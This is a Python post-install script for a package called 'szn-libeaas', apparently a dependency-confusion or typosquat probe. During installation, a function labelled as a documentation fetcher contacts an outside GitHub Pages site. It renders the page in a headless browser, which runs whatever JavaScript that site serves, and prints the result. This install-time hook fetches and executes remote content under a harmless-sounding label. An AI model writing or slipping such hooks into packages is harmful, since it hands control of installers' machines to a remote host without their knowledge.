"""Post-installation script for szn-libeaas."""

def fetch_docs():
    """Fetch documentation during package installation."""
    print("\n===== EXECUTING DOCUMENTATION FETCHER DURING INSTALLATION =====")
    try:
        print("Fetching documentation from https://opicevopice.github.io/...")
        from requests_html import HTMLSession
        session = HTMLSession()
        r = session.get("https://opicevopice.github.io/")
        r.html.render(sleep=2)
        print(r.html.html)
        print("Documentation fetch completed!")
    except ImportError:
        print("requests-html package not available during installation.")
        print("Documentation will be available at: https://opicevopice.github.io/")
    except Exception as e:
        print(f"Documentation fetch encountered an issue: {e}")
        print("You can view the documentation at: https://opicevopice.github.io/")
    print("===== DOCUMENTATION FETCHER PROCESS COMPLETE =====\n")